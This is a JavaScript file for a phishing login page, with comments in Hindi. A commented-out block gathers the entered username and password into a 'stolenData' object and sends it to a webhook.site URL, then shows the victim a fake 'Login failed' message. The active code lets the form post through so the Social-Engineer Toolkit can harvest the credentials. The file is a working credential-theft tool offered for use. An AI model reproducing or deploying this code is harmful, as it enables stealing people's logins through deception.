document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('loginForm');
    const message = document.getElementById('message');

    // fetch वाला कोड कमेंट – SET के लिए POST होने दो
    /*
    form.addEventListener('submit', function(event) {
        event.preventDefault();  // पेज रिफ्रेश रोकें

        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // डेटा पैक करें
        const stolenData = {
            username: username,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            ip: 'unknown'  // रीयल में IP कैप्चर करने के लिए API यूज कर सकते हो
        };

        // webhook.site URL यहां पेस्ट करें (तुम्हारा यूनिक URL)
        const webhookUrl = 'https://webhook.site/6b3138fc-1a2b-48de-8bce-70591eb62bda';  // <-- यहां अपना URL डालो!

        fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(stolenData)
        })
        .then(response => response.text())
        .then(data => {
            message.textContent = 'Login failed! Please try again.';  // विक्टिम को धोखा
            console.log('Data sent! Check webhook.site');  // कंसोल में मैसेज
            // ऑप्शनल: असली साइट पर रीडायरेक्ट
            // setTimeout(() => { window.location.href = 'https://example.com'; }, 2000);
        })
        .catch(error => {
            console.error('Error sending data:', error);
            message.textContent = 'Network error. Try again.';
        });
    });
    */

    // सिर्फ मैसेज दिखाने के लिए (POST को मत रोकना)
    form.addEventListener('submit', function(event) {
        // event.preventDefault();  // मत रोकना, SET कैच कर लेगा
        message.textContent = 'Login failed! Please try again. (Demo Mode)';
        console.log('Form submitted for SET harvesting');
    });
});